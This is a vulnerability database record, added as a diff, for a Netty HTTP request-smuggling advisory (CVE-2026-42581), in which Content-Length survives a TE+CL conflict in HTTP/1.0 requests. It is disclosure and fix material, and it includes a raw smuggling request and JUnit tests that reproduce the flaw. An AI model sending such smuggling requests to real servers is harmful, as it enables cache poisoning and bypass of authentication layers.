@@ -1,0 +1,426 @@
+advisory_id: GHSA-xxqh-mfjm-7mv9
+datasource_id: github_osv/GHSA-xxqh-mfjm-7mv9
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-xxqh-mfjm-7mv9/GHSA-xxqh-mfjm-7mv9.json
+aliases:
+  - CVE-2026-42581
+summary: |
+  Netty HTTP/1.0 TE+CL Coexistence Bypasses Smuggling Sanitization
+  # NETTY HTTP/1.0 TE+CL Coexistence Bypasses Smuggling Sanitization
+
+  | Field     | Value |
+  |-----------|-------|
+  | Library   | `io.netty:netty-codec-http` |
+  | Component | `codec-http` — `HttpObjectDecoder` |
+  | Severity  | **HIGH** |
+  | Affects   | HEAD, commit `4f3533ae` confirmed |
+
+  ---
+
+  ## Summary
+
+  `HttpObjectDecoder` strips a conflicting `Content-Length` header when a request carries both `Transfer-Encoding: chunked` and `Content-Length`, but only for HTTP/1.1 messages. The guard is absent for HTTP/1.0. An attacker that sends an HTTP/1.0 request with both headers causes Netty to decode the body as chunked while leaving `Content-Length` intact in the forwarded `HttpMessage`. Any downstream proxy or handler that trusts `Content-Length` over `Transfer-Encoding` will disagree on message boundaries, enabling request smuggling.
+
+  ---
+
+  ## Root Cause
+
+  ```java
+  // HttpObjectDecoder.java:828-833
+  if (HttpUtil.isTransferEncodingChunked(message)) {
+      this.chunked = true;
+      if (!contentLengthFields.isEmpty() && message.protocolVersion() == HttpVersion.HTTP_1_1) {
+          handleTransferEncodingChunkedWithContentLength(message);  // strips CL — HTTP/1.1 only
+      }
+      return State.READ_CHUNK_SIZE;
+  }
+
+  // HttpObjectDecoder.java:870-873
+  protected void handleTransferEncodingChunkedWithContentLength(HttpMessage message) {
+      message.headers().remove(HttpHeaderNames.CONTENT_LENGTH);
+      contentLength = Long.MIN_VALUE;
+  }
+  ```
+
+  The conflict-resolution path is gated on `message.protocolVersion() == HttpVersion.HTTP_1_1`. When the request declares `HTTP/1.0`, the condition is false, `handleTransferEncodingChunkedWithContentLength` is never called, and the `Content-Length` header survives into the forwarded message. Netty still processes the body as chunked; a downstream component that is CL-first interprets the same bytes as a separate request.
+
+  ---
+
+  ## Proof of Concept
+
+  ```
+  POST /api HTTP/1.0\r\n
+  Host: internal.example.com\r\n
+  Transfer-Encoding: chunked\r\n
+  Content-Length: 0\r\n
+  \r\n
+  5\r\n
+  GPOST\r\n
+  0\r\n
+  \r\n
+  ```
+
+  Netty consumes the full chunked body (5 bytes + terminator). A downstream CL-first proxy reads `Content-Length: 0`, considers the request complete at the blank line, and treats `5\r\nGPOST\r\n0\r\n\r\n` as the start of a second request.
+
+  ---
+
+  ## Conditions Required
+
+  1. Netty is deployed behind a reverse proxy or load balancer that is `Content-Length`-first (nginx, some HAProxy configs, AWS ALB in certain modes).
+  2. Attacker can send HTTP/1.0 requests (either directly or by downgrading via connection manipulation).
+  3. No additional HTTP/1.0 stripping layer between attacker and Netty.
+
+  ---
+
+  ## Impact
+
+  Request smuggling at the Netty edge. Allows cache poisoning, session fixation against other users, unauthorized access to internal endpoints, and bypassing of WAF or authentication layers that inspect only the first logical request.
+
+  ---
+
+  ## Confirmed PoC Test
+
+  Verified against HEAD (`4f3533ae`) using `EmbeddedChannel`. Both tests pass, confirming the vulnerability and the HTTP/1.1 contrast.
+
+  ```java
+  package io.netty.handler.codec.http;
+
+  import io.netty.buffer.Unpooled;
+  import io.netty.channel.embedded.EmbeddedChannel;
+  import io.netty.util.CharsetUtil;
+  import org.junit.jupiter.api.Test;
+
+  import static org.junit.jupiter.api.Assertions.*;
+
+  public class NettySmugglingSec001Test {
+
+      // VULNERABLE: Content-Length survives in HTTP/1.0 TE+CL conflict
+      @Test
+      public void http10_contentLengthNotStripped() {
+          EmbeddedChannel ch = new EmbeddedChannel(new HttpRequestDecoder());
+          ch.writeInbound(Unpooled.copiedBuffer(
+                  "POST /api HTTP/1.0\r\n" +
+                  "Transfer-Encoding: chunked\r\n" +
+                  "Content-Length: 0\r\n" +
+                  "\r\n" +
+                  "5\r\nGPOST\r\n0\r\n\r\n", CharsetUtil.US_ASCII));
+
+          HttpRequest req = ch.readInbound();
+          assertEquals(HttpVersion.HTTP_1_0, req.protocolVersion());
+          // Content-Length: 0 survives — downstream CL-first proxy treats chunked body as new request
+          assertNotNull(req.headers().get(HttpHeaderNames.CONTENT_LENGTH), "VULNERABLE: CL not stripped");
+          ch.finishAndReleaseAll();
+      }
+
+      // SAFE: HTTP/1.1 correctly strips Content-Length on TE+CL conflict
+      @Test
+      public void http11_contentLengthStripped() {
+          EmbeddedChannel ch = new EmbeddedChannel(new HttpRequestDecoder());
+          ch.writeInbound(Unpooled.copiedBuffer(
+                  "POST /api HTTP/1.1\r\n" +
+                  "Transfer-Encoding: chunked\r\n" +
+                  "Content-Length: 0\r\n" +
+                  "\r\n" +
+                  "5\r\nGPOST\r\n0\r\n\r\n", CharsetUtil.US_ASCII));
+
+          HttpRequest req = ch.readInbound();
+          assertNull(req.headers().get(HttpHeaderNames.CONTENT_LENGTH), "SAFE: CL correctly stripped");
+          ch.finishAndReleaseAll();
+      }
+  }
+  ```
+
+  ---
+
+  ## Fix Guidance
+
+  Remove the `message.protocolVersion() == HttpVersion.HTTP_1_1` guard in `HttpObjectDecoder`, applying `handleTransferEncodingChunkedWithContentLength` unconditionally whenever both `Transfer-Encoding: chunked` and `Content-Length` are present, regardless of protocol version.
+impacted_packages:
+  - purl: pkg:maven/io.netty/netty-codec-http
+    affected_versions: vers:maven/>=4.2.0.Alpha1|<=4.2.12.Final
+    fixed_versions: vers:maven/4.2.13.Final
+    affected_packages:
+      - pkg:maven/io.netty/netty-codec-http@4.2.0.Alpha1
+      - pkg:maven/io.netty/netty-codec-http@4.2.0.Alpha2
+      - pkg:maven/io.netty/netty-codec-http@4.2.0.Alpha3
+      - pkg:maven/io.netty/netty-codec-http@4.2.0.Alpha4
+      - pkg:maven/io.netty/netty-codec-http@4.2.0.Alpha5
+      - pkg:maven/io.netty/netty-codec-http@4.2.0.Beta1
+      - pkg:maven/io.netty/netty-codec-http@4.2.0.RC1
+      - pkg:maven/io.netty/netty-codec-http@4.2.0.RC2
+      - pkg:maven/io.netty/netty-codec-http@4.2.0.RC3
+      - pkg:maven/io.netty/netty-codec-http@4.2.0.RC4
+      - pkg:maven/io.netty/netty-codec-http@4.2.0.Final
+      - pkg:maven/io.netty/netty-codec-http@4.2.1.Final
+      - pkg:maven/io.netty/netty-codec-http@4.2.2.Final
+      - pkg:maven/io.netty/netty-codec-http@4.2.3.Final
+      - pkg:maven/io.netty/netty-codec-http@4.2.4.Final
+      - pkg:maven/io.netty/netty-codec-http@4.2.5.Final
+      - pkg:maven/io.netty/netty-codec-http@4.2.6.Final
+      - pkg:maven/io.netty/netty-codec-http@4.2.7.Final
+      - pkg:maven/io.netty/netty-codec-http@4.2.8.Final
+      - pkg:maven/io.netty/netty-codec-http@4.2.9.Final
+      - pkg:maven/io.netty/netty-codec-http@4.2.10.Final
+      - pkg:maven/io.netty/netty-codec-http@4.2.11.Final
+      - pkg:maven/io.netty/netty-codec-http@4.2.12.Final
+    fixed_packages:
+      - pkg:maven/io.netty/netty-codec-http@4.2.13.Final
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:maven/io.netty/netty-codec-http
+    affected_versions: vers:maven/<=4.1.132.Final
+    fixed_versions: vers:maven/4.1.133.Final
+    affected_packages:
+      - pkg:maven/io.netty/netty-codec-http@4.0.0.Alpha1
+      - pkg:maven/io.netty/netty-codec-http@4.0.0.Alpha2
+      - pkg:maven/io.netty/netty-codec-http@4.0.0.Alpha3
+      - pkg:maven/io.netty/netty-codec-http@4.0.0.Alpha4
+      - pkg:maven/io.netty/netty-codec-http@4.0.0.Alpha5
+      - pkg:maven/io.netty/netty-codec-http@4.0.0.Alpha6
+      - pkg:maven/io.netty/netty-codec-http@4.0.0.Alpha7
+      - pkg:maven/io.netty/netty-codec-http@4.0.0.Alpha8
+      - pkg:maven/io.netty/netty-codec-http@4.0.0.Beta1
+      - pkg:maven/io.netty/netty-codec-http@4.0.0.Beta2
+      - pkg:maven/io.netty/netty-codec-http@4.0.0.Beta3
+      - pkg:maven/io.netty/netty-codec-http@4.0.0.CR1
+      - pkg:maven/io.netty/netty-codec-http@4.0.0.CR2
+      - pkg:maven/io.netty/netty-codec-http@4.0.0.CR3
+      - pkg:maven/io.netty/netty-codec-http@4.0.0.CR4
+      - pkg:maven/io.netty/netty-codec-http@4.0.0.CR5
+      - pkg:maven/io.netty/netty-codec-http@4.0.0.CR6
+      - pkg:maven/io.netty/netty-codec-http@4.0.0.CR7
+      - pkg:maven/io.netty/netty-codec-http@4.0.0.CR8
+      - pkg:maven/io.netty/netty-codec-http@4.0.0.CR9
+      - pkg:maven/io.netty/netty-codec-http@4.0.0.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.1.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.2.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.3.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.4.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.5.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.6.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.7.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.8.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.9.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.10.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.11.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.12.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.13.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.14.Beta1
+      - pkg:maven/io.netty/netty-codec-http@4.0.14.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.15.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.16.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.17.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.18.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.19.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.20.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.21.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.22.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.23.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.24.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.25.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.26.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.27.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.28.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.29.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.30.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.31.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.32.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.33.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.34.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.35.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.36.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.37.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.38.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.39.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.40.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.41.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.42.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.43.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.44.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.45.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.46.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.47.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.48.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.49.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.50.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.51.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.52.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.53.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.54.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.55.Final
+      - pkg:maven/io.netty/netty-codec-http@4.0.56.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.0.Beta1
+      - pkg:maven/io.netty/netty-codec-http@4.1.0.Beta2
+      - pkg:maven/io.netty/netty-codec-http@4.1.0.Beta3
+      - pkg:maven/io.netty/netty-codec-http@4.1.0.Beta4
+      - pkg:maven/io.netty/netty-codec-http@4.1.0.Beta5
+      - pkg:maven/io.netty/netty-codec-http@4.1.0.Beta6
+      - pkg:maven/io.netty/netty-codec-http@4.1.0.Beta7
+      - pkg:maven/io.netty/netty-codec-http@4.1.0.Beta8
+      - pkg:maven/io.netty/netty-codec-http@4.1.0.CR1
+      - pkg:maven/io.netty/netty-codec-http@4.1.0.CR2
+      - pkg:maven/io.netty/netty-codec-http@4.1.0.CR3
+      - pkg:maven/io.netty/netty-codec-http@4.1.0.CR4
+      - pkg:maven/io.netty/netty-codec-http@4.1.0.CR5
+      - pkg:maven/io.netty/netty-codec-http@4.1.0.CR6
+      - pkg:maven/io.netty/netty-codec-http@4.1.0.CR7
+      - pkg:maven/io.netty/netty-codec-http@4.1.0.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.1.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.2.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.3.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.4.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.5.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.6.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.7.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.8.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.9.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.10.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.11.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.12.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.13.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.14.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.15.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.16.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.17.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.18.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.19.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.20.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.21.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.22.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.23.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.24.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.25.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.26.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.27.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.28.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.29.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.30.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.31.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.32.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.33.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.34.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.35.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.36.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.37.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.38.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.39.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.40.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.41.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.42.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.43.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.44.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.45.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.46.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.47.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.48.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.49.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.50.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.51.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.52.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.53.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.54.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.55.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.56.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.57.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.58.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.59.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.60.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.61.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.62.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.63.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.64.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.65.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.66.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.67.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.68.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.69.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.70.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.71.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.72.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.73.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.74.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.75.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.76.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.77.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.78.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.79.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.80.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.81.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.82.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.83.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.84.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.85.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.86.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.87.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.88.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.89.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.90.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.91.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.92.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.93.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.94.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.95.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.96.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.97.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.98.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.99.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.100.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.101.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.102.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.103.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.104.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.105.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.106.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.107.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.108.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.109.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.110.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.111.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.112.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.113.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.114.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.115.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.116.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.117.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.118.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.119.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.120.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.121.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.122.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.123.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.124.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.125.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.126.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.127.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.128.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.129.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.130.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.131.Final
+      - pkg:maven/io.netty/netty-codec-http@4.1.132.Final
+    fixed_packages:
+      - pkg:maven/io.netty/netty-codec-http@4.1.133.Final
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '5.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-xxqh-mfjm-7mv9/GHSA-xxqh-mfjm-7mv9.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-444
+references:
+  - url: https://github.com/netty/netty
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-42581
+    reference_type:
+    reference_id: CVE-2026-42581
+  - url: https://github.com/netty/netty/security/advisories/GHSA-xxqh-mfjm-7mv9
+    reference_type:
+    reference_id: GHSA-xxqh-mfjm-7mv9
+exploits: []
